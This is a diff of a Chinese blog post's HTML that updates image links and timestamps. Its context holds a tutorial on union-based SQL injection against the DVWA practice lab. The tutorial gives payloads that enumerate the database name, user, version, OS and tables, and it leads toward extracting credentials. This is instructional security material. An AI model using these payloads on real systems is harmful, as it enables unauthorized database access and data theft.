@@ -29,16 +29,16 @@
 <meta property="og:site_name" content="犯罪现场">
 <meta property="og:description" content="一.SQL注入简介 Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。 二.sql注入漏洞详解 Sql 注入带来的威胁主要有如下几点  猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。 绕过认证，列如绕过验证登录网站后台。 注入可以借助数据库的存储过程进行提权等操作  Sq">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://zuifan.github.io/.io//1.png">
+<meta property="og:image" content="https://s2.loli.net/2022/03/25/9t2oYpTwesS6JjZ.png">
 <meta property="og:image" content="https://zuifan.github.io/.io//2.png">
 <meta property="og:image" content="https://zuifan.github.io/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C4.png">
 <meta property="og:image" content="https://zuifan.github.io/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C5png.png">
 <meta property="og:image" content="https://zuifan.github.io/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C6.png">
 <meta property="article:published_time" content="2022-03-25T08:10:05.000Z">
-<meta property="article:modified_time" content="2022-03-25T10:40:37.974Z">
+<meta property="article:modified_time" content="2022-03-25T11:02:16.193Z">
 <meta property="article:author" content="ZUIFAN">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://zuifan.github.io/.io//1.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/03/25/9t2oYpTwesS6JjZ.png">
 
 
 <link rel="canonical" href="https://zuifan.github.io/2022/03/25/SQL%E6%B3%A8%E5%85%A501/">
@@ -281,7 +281,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-03-25 16:10:05 / 修改时间：18:40:37" itemprop="dateCreated datePublished" datetime="2022-03-25T16:10:05+08:00">2022-03-25</time>
+      <time title="创建时间：2022-03-25 16:10:05 / 修改时间：19:02:16" itemprop="dateCreated datePublished" datetime="2022-03-25T16:10:05+08:00">2022-03-25</time>
     </span>
 
   
@@ -327,7 +327,7 @@
 </ul>
 <h2 id="Sql-注入示例一-猜解数据库">Sql 注入示例一.猜解数据库</h2>
 <p>​      使用DVWA渗透测试平台，作为攻击测试的目标：</p>
-<p><img src="/.io//1.png" alt="1"></p>
+<p><img src="https://s2.loli.net/2022/03/25/9t2oYpTwesS6JjZ.png" alt="1"></p>
 <p>先输入 1 ，查看回显 (URL中ID=1，说明php页面通过get方法传递参数)：</p>
 <p>那实际上后台执行了什么样的Sql语句呢？点击 <code>view source</code>查看源代码 ，其中的SQL查询代码为：</p>
 <p>SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;’</p>
@@ -347,7 +347,7 @@ union 运算符可以将两个或两个以上 select 语句的查询结果集合
 user()将会返回执行当前查询的用户名.</p>
 <p>实际执行的Sql语句是 :</p>
 <p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select database(),user()#`;</p>
-<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C4.png" alt></p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C4.png" alt=""></p>
 <p>通过上图返回信息，我们成功获取到：</p>
 <ul>
 <li>当前网站使用数据库为 dvwa .</li>
@@ -360,7 +360,7 @@ user()将会返回执行当前查询的用户名.</p>
 </ul>
 <p>实际执行的Sql语句是:</p>
 <p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select version(),@@version_compile_os#`;</p>
-<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C5png.png" alt></p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C5png.png" alt=""></p>
 <p>通过上图返回信息，我们又成功获取到：</p>
 <p>当前数据库版本为 : 5.6.31-0ubuntu0.15.10.1.<br>
 当前操作系统为 : debian-linux-gnu<br>
@@ -369,7 +369,7 @@ information_schema 是 mysql 自带的一张表，这张数据表保存了 Mysql
 <p>我们输入<code>1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#</code>进行查询：<br>
 实际执行的Sql语句是：</p>
 <p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select table_name,table_schema from information_schema.tables where table_schema= ‘dvwa’#`;</p>
-<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C6.png" alt></p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C6.png" alt=""></p>
 <p>通过上图返回信息，我们再获取到：</p>
 <p>dvwa 数据库有两个数据表，分别是 guestbook 和 users .</p>
 <p>我们接下来获取用户名和密码。</p>
